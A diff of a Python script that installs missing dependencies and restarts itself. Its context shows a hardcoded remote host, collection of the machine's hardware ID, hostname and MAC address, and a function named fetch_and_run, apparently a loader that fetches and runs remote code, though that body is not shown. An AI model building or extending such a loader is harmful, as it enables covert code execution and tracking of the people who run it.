@@ -7,6 +7,7 @@ import platform
 import base64
 import socket
 import time
+import importlib
 
 RAILWAY_URL = "web-production-6e33.up.railway.app"
 
@@ -17,8 +18,8 @@ def get_device_info():
         mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
         return hwid, hostname, mac
     except:
+
         return "Unknown", "Unknown", "Unknown"
-    
 def install_from_requirements():
     req_file = os.path.join(os.path.dirname(__file__), "requirements.txt")
     if not os.path.exists(req_file):
@@ -29,13 +30,23 @@ def install_from_requirements():
         libraries = [line.strip() for line in f if line.strip() and not line.startswith("#")]
 
     for lib in libraries:
+      
         lib_name = lib.split('==')[0].split('>=')[0].strip().lower()
-       
-        import_name = "bs4" if lib_name == "beautifulsoup4" else lib_name
-        import_name = "dotenv" if lib_name == "python-dotenv" else import_name
+        
+      
+        import_mapping = {
+            "flask-socketio": "flask_socketio",
+            "googlesearch-python": "googlesearch",
+            "beautifulsoup4": "bs4",
+            "python-dotenv": "dotenv",
+            "duckduckgo_search": "duckduckgo_search"
+        }
+        
+      
+        import_name = import_mapping.get(lib_name, lib_name)
         
         try:
-            __import__(import_name)
+            importlib.import_module(import_name) 
         except ImportError:
             missing_libs.append(lib)
 
@@ -49,16 +60,21 @@ def install_from_requirements():
                 print(f"📥 Installing {lib_name}...")
                 try:
                     subprocess.check_call([sys.executable, "-m", "pip", "install", lib])
+                    
+                 
                     if "playwright" in lib_name:
-                        print("🌐 Downloading Playwright binaries...")
+                        print("🌐 Initializing Playwright Core & Browsers...")
                         subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"])
                 except Exception as e:
                     print(f"❌ Failed to install {lib_name}: {e}")
-            print("\n✅ Environment synchronized. Continuing to boot...\n")
-        else:
-            print("\n🛑 Execution aborted: Cannot run without dependencies.")
+            
+            print("\n✅ Environment ready! Restarting script to apply changes...")
             time.sleep(2)
-            sys.exit() 
+            
+            os.execv(sys.executable, ['python'] + sys.argv) 
+        else:
+            print("\n🛑 Execution aborted.")
+            sys.exit()
 
 def fetch_and_run():
     hwid, hostname, mac = get_device_info()
